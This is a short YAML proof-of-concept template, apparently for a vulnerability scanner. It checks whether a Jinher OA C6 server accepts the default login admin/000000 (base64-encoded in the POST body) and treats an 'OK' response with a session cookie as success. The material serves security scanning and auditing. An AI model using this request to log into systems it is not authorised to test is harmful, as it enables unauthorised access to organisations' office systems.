name: poc-yaml-jinher-oa-c6-default-password
manual: true
transport: http
rules:
  jiner:
    request:
      cache: true
      method: POST
      path: /c6/Jhsoft.Web.login/AjaxForLogin.aspx
      body:
        type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&
    expression: response.status == 200 && response.body.bcontains(b"OK") && "Set-Cookie" in response.headers
expression: jiner()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-POC
